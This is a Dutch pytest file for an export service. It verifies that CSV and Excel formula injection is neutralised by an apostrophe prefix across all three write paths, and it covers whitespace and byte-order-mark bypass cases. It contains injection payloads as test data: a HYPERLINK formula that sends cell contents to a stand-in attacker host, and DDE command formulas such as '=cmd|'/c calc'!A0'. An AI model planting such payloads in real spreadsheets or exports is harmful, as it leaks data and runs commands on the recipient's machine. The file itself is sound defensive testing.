"""DEF-593: CSV/Excel formula injection in de export.

Excel, LibreOffice Calc en Google Sheets interpreteren een celwaarde die begint
met `=`, `+`, `-`, `@`, tab of carriage return als **formule**. Een definitie als
`=HYPERLINK("http://attacker/?d="&A1,"klik")` wordt dan uitgevoerd of aangeboden
op de machine van wie de export opent.

Dit is het enige geverifieerde pad waarlangs deze app schade buiten zichzelf kan
aanrichten. Het combineert met DEF-590: de definitietekst komt uit een LLM dat
een geüpload document als context krijgt. Maar de invoer hoeft niet eens uit het
model te komen — een gebruiker kan de payload rechtstreeks in een definitie typen.

Mitigatie conform OWASP (https://owasp.org/www-community/attacks/CSV_Injection):
prefix de cel met een apostrof, zodat de spreadsheet hem als tekst leest. Niet
strippen: de lezer moet de oorspronkelijke tekst nog kunnen zien.
"""

import csv
from datetime import UTC, datetime
from unittest.mock import Mock

import pytest

pytestmark = pytest.mark.unit

from database.definitie_repository import DefinitieRepository
from database.models import DefinitieRecord
from services.data_aggregation_service import DataAggregationService
from services.export_service import (
    DefinitieExportData,
    ExportLevel,
    ExportService,
    _veilige_cel,
)

#: De zes prefixen die een spreadsheet als formule-start leest.
_GEVAARLIJKE_PREFIXEN = ("=", "+", "-", "@", "\t", "\r")

#: Een payload die in Excel een netwerkverzoek opzet.
_PAYLOAD = '=HYPERLINK("http://attacker.example/?d="&A1,"klik hier")'


@pytest.fixture
def service(tmp_path):
    export_dir = tmp_path / "exports"
    export_dir.mkdir()

    # `_prepare_export_data` vangt élke exception en slaat de definitie stil over
    # (`continue`). Een kale Mock levert dus een lege export en een groene test om
    # de verkeerde reden — de aggregation-service moet echte data teruggeven.
    aggregation = Mock(spec=DataAggregationService)
    aggregation.aggregate_definitie_for_export.return_value = _export_data()

    return ExportService(
        repository=Mock(spec=DefinitieRepository),
        data_aggregation_service=aggregation,
        export_dir=str(export_dir),
    )


def _export_data(**overrides) -> DefinitieExportData:
    basis = {
        "begrip": "toezichthouder",
        "definitie_origineel": "originele definitie",
        "definitie_gecorrigeerd": "gecorrigeerde definitie",
        "definitie_aangepast": "aangepaste definitie",
        "metadata": {"status": "DRAFT", "categorie": "proces"},
        "context_dict": {"organisatorisch": ["OM"]},
        "toetsresultaten": {"score": 0.85},
        "voorbeeld_zinnen": ["voorbeeld 1"],
        "toelichting": "toelichting",
        "synoniemen": "syn1, syn2",
        "voorkeursterm": "toezichthouder",
        "expert_review": "Goedgekeurd",
        "created_at": datetime.now(UTC),
        "updated_at": datetime.now(UTC),
    }
    basis.update(overrides)
    return DefinitieExportData(**basis)


def _lees_csv(pad: str) -> dict[str, str]:
    with open(pad, encoding="utf-8") as f:
        return next(iter(csv.DictReader(f)))


# --- De kwetsbaarheid ---------------------------------------------------------


@pytest.mark.parametrize("prefix", _GEVAARLIJKE_PREFIXEN)
def test_formule_prefix_wordt_geneutraliseerd_in_csv(service, prefix):
    """Elk van de zes prefixen moet als tekst worden weggeschreven."""
    kwaadaardig = f"{prefix}HYPERLINK(1)"
    pad = service._export_to_csv(_export_data(definitie_gecorrigeerd=kwaadaardig))

    cel = _lees_csv(pad)["definitie_gecorrigeerd"]
    assert not cel.startswith(prefix), f"cel begint nog met {prefix!r}: {cel!r}"
    assert cel.startswith("'"), f"geen apostrof-prefix: {cel!r}"


def test_hyperlink_payload_in_definitie_wordt_geneutraliseerd(service):
    pad = service._export_to_csv(_export_data(definitie_gecorrigeerd=_PAYLOAD))
    cel = _lees_csv(pad)["definitie_gecorrigeerd"]
    assert cel == "'" + _PAYLOAD


def test_payload_in_begrip_wordt_geneutraliseerd(service):
    """Niet alleen de definitie: elke tekstkolom is een vector."""
    pad = service._export_to_csv(_export_data(begrip=_PAYLOAD))
    assert _lees_csv(pad)["begrip"] == "'" + _PAYLOAD


def test_payload_in_metadata_wordt_geneutraliseerd(service):
    pad = service._export_to_csv(
        _export_data(metadata={"status": "=cmd|'/c calc'!A0", "categorie": "proces"})
    )
    assert _lees_csv(pad)["status"].startswith("'")


# --- Wat NIET mag veranderen --------------------------------------------------


def test_normale_tekst_blijft_onaangeroerd(service):
    pad = service._export_to_csv(_export_data())
    rij = _lees_csv(pad)
    assert rij["begrip"] == "toezichthouder"
    assert rij["definitie_gecorrigeerd"] == "gecorrigeerde definitie"
    assert "'" not in rij["begrip"]


def test_tekst_met_een_gelijkteken_middenin_blijft_intact(service):
    """Alleen het eerste teken telt; `a = b` is geen formule."""
    tekst = "de formule a = b geldt hier"
    pad = service._export_to_csv(_export_data(definitie_gecorrigeerd=tekst))
    assert _lees_csv(pad)["definitie_gecorrigeerd"] == tekst


def test_lege_waarde_geeft_geen_fout(service):
    """`""[:1]` is `""` — de guard mag niet struikelen over lege cellen."""
    pad = service._export_to_csv(_export_data(definitie_aangepast=""))
    assert _lees_csv(pad)["definitie_aangepast"] == ""


# --- Alle drie de schrijfpaden ------------------------------------------------
#
# `_veilige_rij` wordt op DRIE plekken aangeroepen: `_export_to_csv`,
# `_export_multiple_to_csv` en `_export_multiple_to_excel`. De eerste versie van
# deze testfile raakte alleen de eerste — je kon de guard uit de andere twee
# halen zonder dat één test faalde. Parametriseer daarom over de sinks, niet
# over de invoer.


def _record(begrip: str, definitie: str) -> DefinitieRecord:
    return DefinitieRecord(
        begrip=begrip,
        definitie=definitie,
        categorie="proces",
        status="DRAFT",
        created_at=datetime.now(UTC),
        updated_at=datetime.now(UTC),
    )


def _lees_excel_kolom(pad: str, kolom: str) -> list:
    import openpyxl

    ws = openpyxl.load_workbook(pad).active
    kop = [c.value for c in next(ws.iter_rows(max_row=1))]
    index = kop.index(kolom)
    return [rij[index] for rij in ws.iter_rows(min_row=2, values_only=True)]


def test_meervoudige_csv_neutraliseert_de_payload(service):
    records = [_record("toezichthouder", _PAYLOAD)]
    pad = service._export_multiple_to_csv(records, ExportLevel.BASIS)

    with open(pad, encoding="utf-8") as f:
        rij = next(iter(csv.DictReader(f)))
    assert rij["definitie"].startswith("'"), f"multi-CSV lekt: {rij['definitie']!r}"


def test_excel_export_neutraliseert_de_payload(service):
    """pandas schrijft `=...` als cel met data_type 'f' — een échte formule."""
    records = [_record("toezichthouder", _PAYLOAD)]
    pad = service._export_multiple_to_excel(records, ExportLevel.BASIS)

    waarden = _lees_excel_kolom(pad, "definitie")
    assert waarden[0].startswith("'"), f"Excel lekt: {waarden[0]!r}"


def test_excel_cel_is_tekst_en_geen_formule(service):
    """De harde assertie: openpyxl moet de cel als string typeren, niet als formule."""
    import openpyxl

    records = [_record("toezichthouder", _PAYLOAD)]
    pad = service._export_multiple_to_excel(records, ExportLevel.BASIS)

    ws = openpyxl.load_workbook(pad).active
    kop = [c.value for c in next(ws.iter_rows(max_row=1))]
    kolom = kop.index("definitie") + 1
    cel = ws.cell(row=2, column=kolom)
    assert cel.data_type == "s", f"cel is type {cel.data_type!r}, dus een formule"


# --- Randgevallen die de review vond ------------------------------------------


@pytest.mark.parametrize(
    "payload",
    [
        " =SUM(1)",  # leidende spatie
        "\n=cmd|'/c calc'!A0",  # leidende newline
        "﻿=SUM(1)",  # byte order mark
        "\t=SUM(1)",  # leidende tab
    ],
)
def test_leidende_whitespace_omzeilt_de_guard_niet(payload):
    """Excel en LibreOffice trimmen de kop en evalueren alsnog."""
    assert _veilige_cel(payload).startswith("'"), f"bypass met {payload!r}"


def test_guard_is_idempotent():
    """Twee keer neutraliseren mag geen dubbele apostrof geven."""
    eenmaal = _veilige_cel("=SUM(1)")
    assert _veilige_cel(eenmaal) == eenmaal == "'=SUM(1)"


@pytest.mark.parametrize("waarde", [True, False])
def test_booleans_blijven_booleans(waarde):
    assert _veilige_cel(waarde) is waarde


def test_alleen_een_formuleteken():
    assert _veilige_cel("=") == "'="


# --- De directe celguard ------------------------------------------------------


def test_niet_strings_blijven_hun_eigen_type_houden():
    """Een negatief getal is geen aanvalsvector en mag geen string worden."""
    from services.export_service import _veilige_cel

    assert _veilige_cel(-5) == -5
    assert _veilige_cel(3.14) == 3.14
    assert _veilige_cel(None) is None


def test_negatief_getal_als_string_wordt_wel_geprefixt():
    """Bewuste ruil: `"-5"` uit een tekstveld is niet te onderscheiden van een
    payload, dus die krijgt de apostrof. Numerieke velden blijven `int`/`float`
    en raken de guard niet (zie de test hierboven).
    """
    from services.export_service import _veilige_cel

    assert _veilige_cel("-5") == "'-5"


def test_guard_raakt_tekst_zonder_formuleprefix_niet():
    from services.export_service import _veilige_cel

    assert _veilige_cel("gewone tekst") == "gewone tekst"
    assert _veilige_cel("a = b") == "a = b"
    assert _veilige_cel("") == ""
